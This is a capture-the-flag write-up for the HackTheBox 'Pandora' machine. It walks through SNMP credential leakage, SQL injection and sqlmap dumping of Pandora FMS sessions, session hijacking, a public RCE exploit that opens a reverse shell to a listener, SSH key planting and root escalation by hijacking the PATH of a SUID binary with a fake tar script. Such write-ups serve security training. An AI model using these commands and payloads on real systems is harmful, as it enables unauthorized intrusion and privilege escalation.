---
icon: ubuntu
---

# Pandora - Easy

<figure><img src="../../.gitbook/assets/image (21).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/pandora"><strong>Pandora</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.1.103 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 17:27 -0500
Nmap scan report for 10.129.1.103
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   86.53 ms 10.10.16.1
2   24.76 ms 10.129.1.103
```
{% endcode %}

{% code title="Nmap UDP" %}
```shellscript
sudo nmap -sU -p- --min-rate 10000 -Pn 10.129.1.103 -oN scans/nmap-udpall                                                                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 21:40 -0500
Warning: 10.129.1.103 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.1.103
Host is up (0.083s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```
{% endcode %}

The first port that stands out to me is 161 UDP

### <mark style="color:blue;">SNMP UDP 161 Enumeration</mark>

Use [snmpbrute](https://github.com/SECFORCE/SNMP-Brute) to identify the community strings

```shellscript
python3 ~/tools/SNMP-Brute/snmpbrute.py -t 10.129.1.103
```

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

(RO) stands for read only\
There are a couple of public strings I am going to dump everything using snmpbulkwalk and dig through it

```shellscript
snmpbulkwalk -v2c -c public 10.129.1.103 . | tee snmp-public-v2c.out
```

Let's check out the executables

```shellscript
grep SWRunName snmp-public-v2c.out
```

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

There is a bash process let's check it out

```shellscript
grep sh snmp-public-v2c.out
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

```shellscript
daniel:HotelBabylon23
```

Looking through the process list, there’s a process that’s running a script, `/usr/bin/host_check`, it's passing a username and password:

### <mark style="color:blue;">Credential Spraying</mark>

Credential Spraying reveals SSH access

```shellscript
netexec ssh 10.129.1.103 -u daniel -p HotelBabylon23
```

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as daniel</mark>

```shellscript
ssh daniel@10.129.1.103
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Besides daniel & root there is another user on this box. Noted!

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

there are two site configurations are in `/etc/apache2/sites-enabled`

`000-default.conf` is hosting the default webserver on port 80

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

`pandora.conf` on the other hand is only listening on localhost and under the server name `pandora.panda.htb`. It’s hosted out of `/var/www/pandora`, and running as matt.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Let's setup port forwarding and check it out

### <mark style="color:$primary;">SSH Port Forwarding</mark>

First setup `/etc/hosts` file&#x20;

```shellscript
127.0.0.1	pandora.panda.htb
```

Now for ssh port forwarding

```shellscript
ssh daniel@panda.htb -L 8000:localhost:80
```

Now we can access it at [http://pandora.panda.htb:8000](http://pandora.panda.htb:8000)

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

It's an instance of Pandora FMS with a version on the bottom

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

There is a RCE available for this version, discovered a POC on github

{% embed url="https://github.com/UNICORDev/exploit-CVE-2020-5844" %}

We need some credentials for the RCE to work

#### <mark style="color:$primary;">Unauthenticated SQLI in Pandora FMS v7.0NG.742\_FIX\_PERL2020</mark>

```shellscript
session_id='
```

{% embed url="http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=%27" %}

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

it complains about the number of columns being wrong

```sql
session_id=' order by 3-- -
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

we know it has 3 columns

```sql
session_id=' union select 1,2,3,4-- -
```

I'll use sqlmap to make the process easier

#### <mark style="color:$primary;">SQLMAP</mark>

{% code overflow="wrap" %}
```shellscript
sqlmap -u 'http://pandora.panda.htb:8000/pandora_console/include/chart_generator.php?session_id=1' --batch --dbs
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
sqlmap -u 'http://pandora.panda.htb:8000/pandora_console/include/chart_generator.php?session_id=1' --batch --dbs -D pandora --tables
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

I am going to check out the sessions

{% code overflow="wrap" %}
```shellscript
sqlmap -u 'http://pandora.panda.htb:8000/pandora_console/include/chart_generator.php?session_id=1' --batch --dbs -D pandora -T tsessions_php --dump
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

there is a session for matt

#### <mark style="color:$primary;">Session Login as matt</mark>

To quickly test these sessions, I’ll drop all 20 into a file, and run `wfuzz`

```shellscript
wfuzz -u http://pandora.panda.htb:8000/pandora_console/ -b PHPSESSID=FUZZ -w sessions
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

One returns a much longer page! It just so happens to be the one assigned to matt.

I’ll go into the Firefox dev tools and under “Storage” > “Cookies” find the `PHPSESSID` cookie and replace it with the one from above. Now when I refresh `/pandora_console`, it loads logged in as matt:

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

I discovered a security advisor on Pandora FMS CVE's

{% embed url="https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities" %}

### <mark style="color:blue;">Pandora FMS 7.44 CVE-2020-13851 | RCE</mark>

Pandora FMS 7.44 CVE-2020-13851 RCE allows an authenticated user to achieve remote command execution via the events feature

I found a POC RCE on github

{% embed url="https://github.com/hadrian3689/pandorafms_7.44" %}

#### <mark style="color:$primary;">Exploitation</mark>

I'll use the PHP Session Id I found to get execution

{% code overflow="wrap" %}
```shellscript
python3 pandorafms_7.44.py -t http://pandora.panda.htb:8000/ -c g4e01qdgk36mfdh90hvcc54umq -lhost 10.10.16.3 -lport 9001
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Shell as matt</mark>

#### <mark style="color:$primary;">Setup SSH access</mark>

{% code title="On target machine - matt" %}
```shellscript
mkdir .ssh
cd .ssh
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
cat id_rsa
```
{% endcode %}

Copy the private key to your Kali machine and use it to ssh

{% code title="On Your Kali machine" %}
```shellscript
vi matt_id_rsa
chmod 600 matt_id_rsa
ssh -i matt_id_rsa matt@10.129.2.45
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">SUID Path hijacking tar</mark>

Discovered an interesting SUID, I'll run it and check what happens

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

It’s doing a backup, with a long list of paths, all in `/var/www/pandora`. At the top it references `tar` a couple times, which suggests it’s using `tar` to compress/archive



`ltrace` is installed on Pandora, so I’ll run `pandora_backup` through it. This will drop the SUID bit, but I can still see what it’s trying to do

```shellscript
ltrace /usr/bin/pandora_backup
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

It crashes because it doesn’t have permissions to `/root/.backup/pandora-backup.tar.gz`, which makes sense since `ltrace` drops the privs from SUID.

Still, I’ll note that it’s using `system` to call `tar` without a full path.

Because there’s no path given for `tar`, it will use the current user’s `PATH` environment variable to look for valid executables to run. But I can control that path, which makes this vulnerable to path hijack.

I’ll work from `/dev/shm`, and add that to the current user’s `PATH`:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Now the first place it will look for `tar` is `/dev/shm`.

For a malicious payload, I’ll use a bash script to set SUID on bash:

```shellscript
echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > tar
chmod +x tar
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Now I’ll run `pandora_backup`, and when it reaches the call to `tar`, it will set the SUID on bash

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

With the SUID set on bash it was easy to escalate privileges to root
